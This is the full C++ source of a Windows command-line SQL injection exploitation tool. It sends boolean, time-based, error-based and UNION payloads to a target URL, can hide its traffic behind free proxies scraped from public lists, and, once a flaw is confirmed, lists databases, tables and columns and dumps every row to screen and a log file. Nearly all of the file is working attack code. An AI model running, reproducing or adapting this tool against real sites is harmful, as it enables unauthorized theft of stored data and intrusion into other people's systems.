#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <iomanip>
#include <map>
#include <set>
#include <queue>
#include <random>
#include <thread>
#include <chrono>
#include <mutex>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 131072
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define MAX_RETRIES 3
#define VERSION "3.0"

using namespace std;

struct Target {
    string host;
    int port;
    string path;
    string data;
    string cookie;
    string user_agent;
    string referer;
    bool use_post;
    bool vulnerable;
    string technique;
    string db_type;
    string db_name;
    string current_user;
    vector<string> databases;
    map<string, vector<string>> tables;
    map<string, map<string, vector<string>>> columns;
    Target() : port(80), use_post(false), vulnerable(false) {}
};

struct ProxyInfo {
    string host;
    int port;
    bool working;
    int responseTime;
    ProxyInfo() : port(0), working(false), responseTime(0) {}
};

struct Payload {
    string name;
    string payload;
    string technique;
    Payload(string n, string p, string t) : name(n), payload(p), technique(t) {}
};

struct Option {
    bool proxy;
    bool verbose;
    int delay;
    Option() : proxy(false), verbose(false), delay(0) {}
};

Target target;
Option option;
vector<ProxyInfo> proxyList;
vector<Payload> payloads;
ofstream logFile;
string baseline_response;
int baseline_time;
int totalRequests = 0;
int currentProxyIndex = 0;
mutex logMutex;

vector<string> proxySources = {
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
};

void writeLog(const string& msg) {
    lock_guard<mutex> lock(logMutex);
    time_t now = time(nullptr);
    string t = ctime(&now);
    t.pop_back();
    logFile << "[" << t << "] " << msg << endl;
    logFile.flush();
}

void info(const string& msg) {
    cout << "[*] " << msg << endl;
    writeLog("[INFO] " + msg);
}

void success(const string& msg) {
    cout << "[+] " << msg << endl;
    writeLog("[SUCCESS] " + msg);
}

void error(const string& msg) {
    cout << "[-] " << msg << endl;
    writeLog("[ERROR] " + msg);
}

void vuln(const string& msg) {
    cout << "[!!!] " << msg << endl;
    writeLog("[VULNERABLE] " + msg);
}

void debug(const string& msg) {
    if (option.verbose) {
        cout << "[DEBUG] " << msg << endl;
    }
    writeLog("[DEBUG] " + msg);
}

void printStatus() {
    cout << "\r[*] Requests: " << totalRequests << "    " << flush;
}

string urlEncode(const string& str) {
    string encoded;
    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else if (c == ' ') {
            encoded += '+';
        } else {
            char hex[4];
            sprintf_s(hex, sizeof(hex), "%%%02X", (unsigned char)c);
            encoded += hex;
        }
    }
    return encoded;
}

bool resolveHost(const string& host, string& ip) {
    struct hostent* he = gethostbyname(host.c_str());
    if (!he) return false;
    struct in_addr addr;
    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    ip = inet_ntoa(addr);
    return true;
}

bool sendDirect(const string& request, string& response, int& response_time) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;
    
    int timeout = 10000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target.port);
    
    string server_ip;
    if (!resolveHost(target.host, server_ip)) {
        closesocket(sock);
        return false;
    }
    
    server_addr.sin_addr.s_addr = inet_addr(server_ip.c_str());
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }
    
    clock_t start = clock();
    if (send(sock, request.c_str(), (int)request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }
    
    response.clear();
    char buffer[BUFFER_SIZE];
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() >= BUFFER_SIZE - 1024) break;
    }
    
    clock_t end = clock();
    response_time = (int)((double)(end - start) * 1000 / CLOCKS_PER_SEC);
    
    closesocket(sock);
    totalRequests++;
    return true;
}

bool sendViaProxy(const string& request, string& response, int& response_time, ProxyInfo& proxy) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;
    
    struct sockaddr_in proxy_addr;
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy.port);
    
    string proxy_ip;
    if (!resolveHost(proxy.host, proxy_ip)) {
        closesocket(sock);
        return false;
    }
    
    proxy_addr.sin_addr.s_addr = inet_addr(proxy_ip.c_str());
    
    if (connect(sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }
    
    string proxy_request = "CONNECT " + target.host + ":" + to_string(target.port) + " HTTP/1.1\r\n";
    proxy_request += "Host: " + target.host + "\r\n";
    proxy_request += "User-Agent: " USER_AGENT "\r\n";
    proxy_request += "Proxy-Connection: Keep-Alive\r\n";
    proxy_request += "\r\n";
    
    if (send(sock, proxy_request.c_str(), (int)proxy_request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }
    
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);
    int n = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    string response_connect(buffer);
    
    if (response_connect.find("200") == string::npos) {
        closesocket(sock);
        return false;
    }
    
    clock_t start = clock();
    if (send(sock, request.c_str(), (int)request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }
    
    response.clear();
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() >= BUFFER_SIZE - 1024) break;
    }
    
    clock_t end = clock();
    response_time = (int)((double)(end - start) * 1000 / CLOCKS_PER_SEC);
    
    closesocket(sock);
    totalRequests++;
    return true;
}

string createHTTPRequest(const string& param_value) {
    string request;
    string ua = target.user_agent.empty() ? USER_AGENT : target.user_agent;
    
    if (target.use_post) {
        string post_data = target.data;
        size_t inject_pos = post_data.find("[INJECT]");
        if (inject_pos != string::npos) {
            post_data.replace(inject_pos, 8, param_value);
        }
        
        request = "POST " + target.path + " HTTP/1.1\r\n";
        request += "Host: " + target.host + "\r\n";
        request += "User-Agent: " + ua + "\r\n";
        request += "Content-Type: application/x-www-form-urlencoded\r\n";
        request += "Content-Length: " + to_string(post_data.length()) + "\r\n";
        request += "Connection: close\r\n";
        if (!target.cookie.empty()) request += "Cookie: " + target.cookie + "\r\n";
        if (!target.referer.empty()) request += "Referer: " + target.referer + "\r\n";
        request += "\r\n";
        request += post_data;
    } else {
        string full_path = target.path + param_value;
        request = "GET " + full_path + " HTTP/1.1\r\n";
        request += "Host: " + target.host + "\r\n";
        request += "User-Agent: " + ua + "\r\n";
        request += "Accept: */*\r\n";
        request += "Connection: close\r\n";
        if (!target.cookie.empty()) request += "Cookie: " + target.cookie + "\r\n";
        if (!target.referer.empty()) request += "Referer: " + target.referer + "\r\n";
        request += "\r\n";
    }
    
    return request;
}

bool sendRequest(const string& payload_value, string& response, int& response_time) {
    string final_payload = target.use_post ? payload_value : urlEncode(payload_value);
    string request = createHTTPRequest(final_payload);
    
    for (int retry = 0; retry < MAX_RETRIES; retry++) {
        if (option.proxy && !proxyList.empty() && currentProxyIndex < (int)proxyList.size()) {
            if (sendViaProxy(request, response, response_time, proxyList[currentProxyIndex])) {
                return true;
            }
        } else {
            if (sendDirect(request, response, response_time)) {
                return true;
            }
        }
        
        if (option.delay > 0) {
            this_thread::sleep_for(chrono::milliseconds(option.delay));
        }
    }
    
    return false;
}

void rotateProxy() {
    if (option.proxy && !proxyList.empty()) {
        currentProxyIndex = (currentProxyIndex + 1) % proxyList.size();
        debug("Proxy: " + proxyList[currentProxyIndex].host + ":" + to_string(proxyList[currentProxyIndex].port));
    }
}

string httpGet(const string& url) {
    string host, path;
    size_t start = 0;
    
    if (url.find("http://") == 0) start = 7;
    else if (url.find("https://") == 0) start = 8;
    
    size_t slash = url.find('/', start);
    if (slash != string::npos) {
        host = url.substr(start, slash - start);
        path = url.substr(slash);
    } else {
        host = url.substr(start);
        path = "/";
    }
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return "";
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    
    string ip;
    if (!resolveHost(host, ip)) {
        closesocket(sock);
        return "";
    }
    
    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return "";
    }
    
    string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "User-Agent: " USER_AGENT "\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";
    
    send(sock, request.c_str(), (int)request.length(), 0);
    
    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 50000) break;
    }
    
    closesocket(sock);
    
    size_t body_start = response.find("\r\n\r\n");
    if (body_start != string::npos) {
        return response.substr(body_start + 4);
    }
    
    return response;
}

void parseProxy(const string& content) {
    stringstream ss(content);
    string line;
    
    while (getline(ss, line)) {
        if (line.empty()) continue;
        
        ProxyInfo p;
        size_t colon = line.find(':');
        if (colon == string::npos) continue;
        
        p.host = line.substr(0, colon);
        
        size_t colon2 = line.find(':', colon + 1);
        if (colon2 != string::npos) {
            p.port = stoi(line.substr(colon + 1, colon2 - colon - 1));
        } else {
            size_t space = line.find(' ', colon + 1);
            if (space != string::npos) {
                p.port = stoi(line.substr(colon + 1, space - colon - 1));
            } else {
                p.port = stoi(line.substr(colon + 1));
            }
        }
        
        if (p.port > 0 && p.port < 65535) {
            proxyList.push_back(p);
        }
    }
}

void fetchProxies() {
    if (!option.proxy) return;
    
    info("Downloading proxies from " + to_string(proxySources.size()) + " sources");
    
    for (const string& src : proxySources) {
        info("Fetching: " + src);
        string content = httpGet(src);
        if (!content.empty()) {
            parseProxy(content);
            success("Total: " + to_string(proxyList.size()));
        } else {
            error("Failed: " + src);
        }
        this_thread::sleep_for(chrono::seconds(1));
    }
    
    success("Collected " + to_string(proxyList.size()) + " proxies");
}

bool testProxy(ProxyInfo& proxy) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(proxy.port);
    
    string ip;
    if (!resolveHost(proxy.host, ip)) {
        closesocket(sock);
        return false;
    }
    
    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    
    auto start = chrono::steady_clock::now();
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }
    
    auto end = chrono::steady_clock::now();
    proxy.responseTime = (int)chrono::duration_cast<chrono::milliseconds>(end - start).count();
    
    string request = "GET http://httpbin.org/ip HTTP/1.1\r\n";
    request += "Host: httpbin.org\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";
    
    send(sock, request.c_str(), (int)request.length(), 0);
    
    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 5000) break;
    }
    
    closesocket(sock);
    
    if (response.find(proxy.host) != string::npos) {
        proxy.working = true;
        return true;
    }
    
    return false;
}

void filterProxies() {
    if (!option.proxy) return;
    
    info("Testing " + to_string(proxyList.size()) + " proxies");
    
    vector<ProxyInfo> working;
    int tested = 0;
    
    for (ProxyInfo& p : proxyList) {
        tested++;
        cout << "\rTesting: " << tested << "/" << proxyList.size() << " - " << p.host << ":" << p.port << "   " << flush;
        
        if (testProxy(p)) {
            working.push_back(p);
            cout << endl;
            success("Working: " + p.host + ":" + to_string(p.port) + " (" + to_string(p.responseTime) + "ms)");
        }
        
        if (tested % 10 == 0) {
            this_thread::sleep_for(chrono::milliseconds(500));
        }
    }
    
    cout << endl;
    proxyList = working;
    
    sort(proxyList.begin(), proxyList.end(), [](const ProxyInfo& a, const ProxyInfo& b) {
        return a.responseTime < b.responseTime;
    });
    
    success("Found " + to_string(proxyList.size()) + " working proxies");
}

bool hasSQLError(const string& response) {
    vector<string> errors = {
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
        "Unclosed quotation", "Microsoft OLE DB", "You have an error",
        "Warning: mysql", "mysqli_sql_exception", "PDOException",
        "SQLSTATE", "Unknown column", "Table doesn't exist"
    };
    
    string lower = response;
    transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    
    for (const auto& err : errors) {
        string e = err;
        transform(e.begin(), e.end(), e.begin(), ::tolower);
        if (lower.find(e) != string::npos) return true;
    }
    return false;
}

string detectDB(const string& response) {
    string lower = response;
    transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    
    if (lower.find("mysql") != string::npos) return "MySQL";
    if (lower.find("postgresql") != string::npos) return "PostgreSQL";
    if (lower.find("sql server") != string::npos) return "MSSQL";
    if (lower.find("oracle") != string::npos) return "Oracle";
    if (lower.find("sqlite") != string::npos) return "SQLite";
    return "Unknown";
}

string extractError(const string& response) {
    size_t start = response.find("~");
    if (start == string::npos) start = response.find(">");
    if (start == string::npos) return "";
    
    size_t end = response.find("<", start);
    if (end == string::npos) end = response.find("\n", start);
    if (end == string::npos) end = start + 200;
    
    if (end > start && (end - start) < 500) {
        string data = response.substr(start, end - start);
        data.erase(remove(data.begin(), data.end(), '\n'), data.end());
        data.erase(remove(data.begin(), data.end(), '\r'), data.end());
        return data;
    }
    return "";
}

string extractUnion(const string& response) {
    size_t body = response.find("\r\n\r\n");
    if (body == string::npos) return "";
    
    string data = response.substr(body + 4);
    
    size_t start = data.find(":-:");
    if (start == string::npos) start = data.find("---");
    if (start == string::npos) start = 0;
    
    size_t end = data.find("<br>", start);
    if (end == string::npos) end = data.find("\n", start);
    if (end == string::npos) end = data.length();
    
    if (end > start && (end - start) < 500) {
        string result = data.substr(start, end - start);
        result.erase(remove(result.begin(), result.end(), '\n'), result.end());
        result.erase(remove(result.begin(), result.end(), '\r'), result.end());
        return result;
    }
    return "";
}

int findUnionCols() {
    info("Finding union columns...");
    
    for (int cols = 1; cols <= 20; cols++) {
        string nulls;
        for (int i = 0; i < cols; i++) {
            if (i > 0) nulls += ",";
            nulls += "NULL";
        }
        string payload = "' UNION SELECT " + nulls + "-- -";
        
        string response;
        int rt;
        if (sendRequest(payload, response, rt)) {
            if (!hasSQLError(response)) {
                success("Found " + to_string(cols) + " columns");
                return cols;
            }
        }
        printStatus();
    }
    return 0;
}

bool testBoolean(const string& true_payload, const string& false_payload) {
    string r1, r2;
    int t1, t2;
    
    if (!sendRequest(true_payload, r1, t1)) return false;
    if (!sendRequest(false_payload, r2, t2)) return false;
    
    if (abs((int)r1.length() - (int)r2.length()) > 50) return true;
    
    vector<string> kw = {"error", "invalid", "warning", "success", "welcome"};
    for (const string& k : kw) {
        bool in1 = (r1.find(k) != string::npos);
        bool in2 = (r2.find(k) != string::npos);
        if (in1 != in2) return true;
    }
    return false;
}

bool testTime(const string& payload, int delay) {
    string response;
    int rt;
    if (!sendRequest(payload, response, rt)) return false;
    return (rt > delay * 900);
}

bool testError(const string& payload) {
    string response;
    int rt;
    if (!sendRequest(payload, response, rt)) return false;
    return hasSQLError(response);
}

bool testUnion(const string& payload) {
    string response;
    int rt;
    if (!sendRequest(payload, response, rt)) return false;
    string data = extractUnion(response);
    if (!data.empty()) return true;
    return false;
}

void initPayloads() {
    payloads.push_back(Payload("Boolean AND true", "' AND '1'='1", "boolean"));
    payloads.push_back(Payload("Boolean AND false", "' AND '1'='2", "boolean"));
    payloads.push_back(Payload("Boolean OR true", "' OR '1'='1", "boolean"));
    payloads.push_back(Payload("Boolean OR false", "' OR '1'='2", "boolean"));
    payloads.push_back(Payload("Time MySQL", "' AND SLEEP(5)-- -", "time"));
    payloads.push_back(Payload("Time PostgreSQL", "' AND pg_sleep(5)-- -", "time"));
    payloads.push_back(Payload("Time MSSQL", "'; WAITFOR DELAY '00:00:05'-- -", "time"));
    payloads.push_back(Payload("Error MySQL", "' AND extractvalue(1,concat(0x7e,database()))-- -", "error"));
    payloads.push_back(Payload("Error PostgreSQL", "' AND 1=cast((SELECT version()) as int)-- -", "error"));
    payloads.push_back(Payload("Union 1", "' UNION SELECT NULL-- -", "union"));
    payloads.push_back(Payload("Union 2", "' UNION SELECT NULL,NULL-- -", "union"));
    payloads.push_back(Payload("Union 3", "' UNION SELECT NULL,NULL,NULL-- -", "union"));
}

bool detectVuln() {
    info("Scanning for SQL injection...");
    
    for (const auto& p : payloads) {
        if (p.technique == "boolean") {
            string tp = p.payload;
            string fp = tp;
            size_t pos = fp.find("'1'='1");
            if (pos != string::npos) fp.replace(pos, 6, "'1'='2");
            pos = fp.find("1=1");
            if (pos != string::npos) fp.replace(pos, 3, "1=2");
            
            if (testBoolean(tp, fp)) {
                target.vulnerable = true;
                target.technique = "Boolean-based";
                success("Found: " + p.name);
                return true;
            }
        }
        else if (p.technique == "time") {
            if (testTime(p.payload, 5)) {
                target.vulnerable = true;
                target.technique = "Time-based";
                success("Found: " + p.name);
                return true;
            }
        }
        else if (p.technique == "error") {
            if (testError(p.payload)) {
                target.vulnerable = true;
                target.technique = "Error-based";
                success("Found: " + p.name);
                return true;
            }
        }
        else if (p.technique == "union") {
            if (testUnion(p.payload)) {
                target.vulnerable = true;
                target.technique = "Union-based";
                success("Found: " + p.name);
                return true;
            }
        }
        
        printStatus();
        rotateProxy();
    }
    
    return false;
}

string booleanExtract(const string& query, int maxlen) {
    string result;
    
    for (int pos = 1; pos <= maxlen; pos++) {
        for (int c = 32; c <= 126; c++) {
            string payload = "' AND ASCII(SUBSTRING((" + query + ")," + to_string(pos) + ",1))=" + to_string(c) + "-- -";
            string fp = "' AND ASCII(SUBSTRING((" + query + ")," + to_string(pos) + ",1))!=" + to_string(c) + "-- -";
            
            if (testBoolean(payload, fp)) {
                result += (char)c;
                cout << "\r[+] " << result << "    " << flush;
                break;
            }
        }
    }
    
    cout << endl;
    return result;
}

string timeExtract(const string& query, int maxlen) {
    string result;
    
    for (int pos = 1; pos <= maxlen; pos++) {
        for (int c = 32; c <= 126; c++) {
            string payload = "' AND IF(ASCII(SUBSTRING((" + query + ")," + to_string(pos) + ",1))=" + to_string(c) + ",SLEEP(5),0)-- -";
            
            if (testTime(payload, 5)) {
                result += (char)c;
                cout << "\r[+] " << result << "    " << flush;
                break;
            }
        }
    }
    
    cout << endl;
    return result;
}

string errorExtract(const string& query) {
    string payload = "' AND extractvalue(1,concat(0x7e,(" + query + ")))-- -";
    
    string response;
    int rt;
    if (sendRequest(payload, response, rt)) {
        string data = extractError(response);
        if (!data.empty()) {
            size_t pos = data.find("~");
            if (pos != string::npos && pos + 1 < data.length()) {
                return data.substr(pos + 1);
            }
            return data;
        }
    }
    return "";
}

string unionExtract(const string& query) {
    int cols = findUnionCols();
    if (cols == 0) return "";
    
    for (int pos = 1; pos <= cols; pos++) {
        string colstr;
        for (int i = 1; i <= cols; i++) {
            if (i > 1) colstr += ",";
            if (i == pos) colstr += "(" + query + ")";
            else colstr += to_string(i);
        }
        
        string payload = "' UNION SELECT " + colstr + "-- -";
        
        string response;
        int rt;
        if (sendRequest(payload, response, rt)) {
            string data = extractUnion(response);
            if (!data.empty()) return data;
        }
    }
    return "";
}

string extractData(const string& query) {
    if (target.technique == "Boolean-based") return booleanExtract(query, 200);
    if (target.technique == "Time-based") return timeExtract(query, 200);
    if (target.technique == "Error-based") return errorExtract(query);
    if (target.technique == "Union-based") return unionExtract(query);
    return "";
}

string getCurrentUser() {
    info("Getting current user...");
    vector<string> queries = {"SELECT CURRENT_USER", "SELECT USER()"};
    for (const string& q : queries) {
        string res = extractData(q);
        if (!res.empty() && res.length() < 100) {
            target.current_user = res;
            success("User: " + res);
            return res;
        }
    }
    return "";
}

string getDBName() {
    info("Getting database name...");
    vector<string> queries = {"SELECT DATABASE()", "SELECT DB_NAME()"};
    for (const string& q : queries) {
        string res = extractData(q);
        if (!res.empty() && res.length() < 100) {
            target.db_name = res;
            success("Database: " + res);
            return res;
        }
    }
    return "";
}

string getVersion() {
    info("Getting database version...");
    vector<string> queries = {"SELECT VERSION()", "SELECT @@VERSION"};
    for (const string& q : queries) {
        string res = extractData(q);
        if (!res.empty()) {
            success("Version: " + res);
            return res;
        }
    }
    return "";
}

vector<string> getDatabases() {
    info("Getting all databases...");
    vector<string> dbs;
    string res = extractData("SELECT schema_name FROM information_schema.schemata");
    if (!res.empty()) {
        stringstream ss(res);
        string db;
        while (getline(ss, db, ',')) {
            if (!db.empty() && db != "information_schema" && db != "mysql") {
                dbs.push_back(db);
                success("DB: " + db);
            }
        }
    }
    target.databases = dbs;
    return dbs;
}

vector<string> getTables(const string& db) {
    info("Getting tables from " + db);
    vector<string> tables;
    string query = "SELECT table_name FROM information_schema.tables WHERE table_schema='" + db + "'";
    string res = extractData(query);
    if (!res.empty()) {
        stringstream ss(res);
        string table;
        while (getline(ss, table, ',')) {
            if (!table.empty()) {
                tables.push_back(table);
                success("Table: " + table);
            }
        }
    }
    return tables;
}

vector<string> getColumns(const string& db, const string& table) {
    info("Getting columns from " + db + "." + table);
    vector<string> cols;
    string query = "SELECT column_name FROM information_schema.columns WHERE table_schema='" + db + "' AND table_name='" + table + "'";
    string res = extractData(query);
    if (!res.empty()) {
        stringstream ss(res);
        string col;
        while (getline(ss, col, ',')) {
            if (!col.empty()) {
                cols.push_back(col);
                success("Column: " + col);
            }
        }
    }
    return cols;
}

void dumpData(const string& db, const string& table, const vector<string>& cols) {
    info("Dumping " + db + "." + table);
    
    string colstr;
    for (size_t i = 0; i < cols.size(); i++) {
        if (i > 0) colstr += ",";
        colstr += cols[i];
    }
    
    string query = "SELECT " + colstr + " FROM " + db + "." + table;
    string res = extractData(query);
    
    if (!res.empty()) {
        cout << "\n========================================\n";
        cout << "Table: " << db << "." << table << "\n";
        cout << "========================================\n";
        
        stringstream ss(res);
        string row;
        while (getline(ss, row, '\n')) {
            if (!row.empty()) {
                cout << row << "\n";
                writeLog("[DATA] " + db + "." + table + ": " + row);
            }
        }
        cout << "========================================\n";
    }
}

void exploit() {
    cout << "\n";
    vuln("SQL INJECTION CONFIRMED!");
    success("Target: " + target.host + ":" + to_string(target.port));
    success("Technique: " + target.technique);
    
    target.db_type = detectDB(baseline_response);
    success("DB Type: " + target.db_type);
    
    getCurrentUser();
    getVersion();
    getDBName();
    getDatabases();
    
    if (!target.databases.empty()) {
        for (const string& db : target.databases) {
            target.tables[db] = getTables(db);
            for (const string& table : target.tables[db]) {
                target.columns[db][table] = getColumns(db, table);
                dumpData(db, table, target.columns[db][table]);
            }
        }
    } else if (!target.db_name.empty()) {
        target.tables[target.db_name] = getTables(target.db_name);
        for (const string& table : target.tables[target.db_name]) {
            target.columns[target.db_name][table] = getColumns(target.db_name, table);
            dumpData(target.db_name, table, target.columns[target.db_name][table]);
        }
    }
    
    success("Exploitation complete!");
    info("Total requests: " + to_string(totalRequests));
}

void printBanner() {
    cout << "\n";
    cout << "========================================\n";
    cout << "  SQL INJECTION EXPLOITATION TOOL\n";
    cout << "  Version " << VERSION << "\n";
    cout << "========================================\n";
    cout << "\n";
}

void scan() {
    printBanner();
    
    info("Target: " + target.host + ":" + to_string(target.port) + target.path);
    info("Method: " + string(target.use_post ? "POST" : "GET"));
    
    info("Getting baseline...");
    if (!sendRequest("''", baseline_response, baseline_time)) {
        error("Cannot connect");
        return;
    }
    success("Baseline: " + to_string(baseline_response.length()) + " bytes, " + to_string(baseline_time) + "ms");
    
    initPayloads();
    info("Loaded " + to_string(payloads.size()) + " payloads");
    
    if (detectVuln()) {
        exploit();
    } else {
        success("No vulnerability found");
    }
    
    info("Log: sqlmap_log.txt");
}

bool parseArgs(int argc, char* argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " -u <url> [options]\n";
        cout << "\nOptions:\n";
        cout << "  -u <url>              Target URL\n";
        cout << "  --data=<data>         POST data ([INJECT])\n";
        cout << "  --cookie=<c>          HTTP Cookie\n";
        cout << "  --proxy               Enable proxy\n";
        cout << "  --delay=<ms>          Request delay\n";
        cout << "  --verbose             Verbose output\n";
        cout << "\nExamples:\n";
        cout << "  " << argv[0] << " -u \"http://testphp.vulnweb.com/artists.php?id=1\"\n";
        cout << "  " << argv[0] << " -u \"http://test.com/login.php\" --data=\"user=admin&pass=[INJECT]\"\n";
        return false;
    }
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-u") == 0 && i + 1 < argc) {
            string url = argv[++i];
            
            if (url.find("http://") == 0) url = url.substr(7);
            else if (url.find("https://") == 0) url = url.substr(8);
            
            size_t slash = url.find('/');
            if (slash != string::npos) {
                target.host = url.substr(0, slash);
                target.path = url.substr(slash);
            } else {
                target.host = url;
                target.path = "/";
            }
            
            size_t colon = target.host.find(':');
            if (colon != string::npos) {
                target.port = stoi(target.host.substr(colon + 1));
                target.host = target.host.substr(0, colon);
            }
        }
        else if (strncmp(argv[i], "--data=", 7) == 0) {
            target.data = argv[i] + 7;
            target.use_post = true;
        }
        else if (strncmp(argv[i], "--cookie=", 9) == 0) {
            target.cookie = argv[i] + 9;
        }
        else if (strcmp(argv[i], "--proxy") == 0) {
            option.proxy = true;
        }
        else if (strncmp(argv[i], "--delay=", 8) == 0) {
            option.delay = stoi(argv[i] + 8);
        }
        else if (strcmp(argv[i], "--verbose") == 0) {
            option.verbose = true;
        }
    }
    
    return !target.host.empty();
}

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleTitle(TEXT("SQL Injection Tool"));
    
    logFile.open("sqlmap_log.txt", ios::app);
    if (!logFile.is_open()) {
        cout << "Cannot open log file\n";
        return 1;
    }
    
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        error("Winsock failed");
        return 1;
    }
    
    if (!parseArgs(argc, argv)) {
        WSACleanup();
        logFile.close();
        cout << "\nPress any key...";
        cin.get();
        return 1;
    }
    
    if (option.proxy) {
        fetchProxies();
        filterProxies();
    }
    
    scan();
    
    logFile.close();
    WSACleanup();
    
    cout << "\nPress any key...";
    cin.get();
    
    return 0;
}
